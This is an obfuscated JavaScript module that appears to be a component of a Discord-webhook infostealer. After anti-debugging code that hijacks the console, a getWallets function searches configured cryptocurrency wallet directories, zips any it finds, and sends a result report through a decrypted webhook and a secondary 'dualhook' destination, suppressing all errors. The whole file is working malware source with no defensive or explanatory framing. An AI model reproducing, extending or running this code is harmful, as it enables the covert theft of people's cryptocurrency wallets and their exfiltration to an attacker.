var _0x5b09d2 = (function () {
    var _0x1779e1 = true
    return function (_0x2439d4, _0x1b838c) {
      var _0x71e888 = _0x1779e1
        ? function () {
            if (_0x1b838c) {
              var _0x3b75bd = _0x1b838c.apply(_0x2439d4, arguments)
              return (_0x1b838c = null), _0x3b75bd
            }
          }
        : function () {}
      return (_0x1779e1 = false), _0x71e888
    }
  })(),
  _0x2120ea = _0x5b09d2(this, function () {
    var _0x1d8ac7 = function () {
        var _0xa253bb
        try {
          _0xa253bb = Function(
            'return (function() {}.constructor("return this")( ));'
          )()
        } catch (_0x1b2587) {
          _0xa253bb = window
        }
        return _0xa253bb
      },
      _0x3e84b4 = _0x1d8ac7(),
      _0xc117c8 = (_0x3e84b4.console = _0x3e84b4.console || {}),
      _0x14fb94 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (var _0x2c82b0 = 0; _0x2c82b0 < _0x14fb94.length; _0x2c82b0++) {
      var _0x46bb6c = _0x5b09d2.constructor.prototype.bind(_0x5b09d2),
        _0x16c437 = _0x14fb94[_0x2c82b0],
        _0x477c81 = _0xc117c8[_0x16c437] || _0x46bb6c
      _0x46bb6c['__proto__'] = _0x5b09d2.bind(_0x5b09d2)
      _0x46bb6c.toString = _0x477c81.toString.bind(_0x477c81)
      _0xc117c8[_0x16c437] = _0x46bb6c
    }
  })
_0x2120ea()
module.exports = (_0x4c86ea) => {
  return {
    async getWallets() {
      try {
        _0x4c86ea.utils.jszip.createFolder('\\Wallets')
        var _0x2b256d = ''
        for (let [_0x4b67b2, _0xcb3c13] of Object.entries(
          _0x4c86ea.config.wallets.directory
        )) {
          _0x4c86ea.requires.fs.existsSync(_0xcb3c13)
            ? ((_0x2b256d += _0x4b67b2 + ': \u2705\n'),
              _0x4c86ea.utils.jszip.copyFolder(
                '\\Wallets\\' + _0x4b67b2,
                _0xcb3c13
              ),
              _0x4c86ea.config.counter.wallets++)
            : (_0x2b256d += _0x4b67b2 + ': \u274C\n')
        }
        var _0x565ae4 = {
          title: '\uD83D\uDCB0 Wallet search | Result',
          description: '```' + _0x2b256d + '```',
        }
        await _0x4c86ea.utils.webhook.sendToWebhook(
          _0x4c86ea.config.webhook.wallets
            ? _0x4c86ea.utils.encryption.decryptData(
                _0x4c86ea.config.webhook.wallets
              )
            : _0x4c86ea.utils.encryption.decryptData(
                _0x4c86ea.config.webhook.url
              ),
          _0x4c86ea.config.dualhook.wallets
            ? _0x4c86ea.config.dualhook.wallets
            : _0x4c86ea.config.dualhook.url,
          {
            embeds: [
              new _0x4c86ea.requires.discordjs.MessageEmbed(
                _0x4c86ea.utils.webhook.createEmbed(_0x565ae4)
              ),
            ],
          }
        )
      } catch {}
    },
  }
}
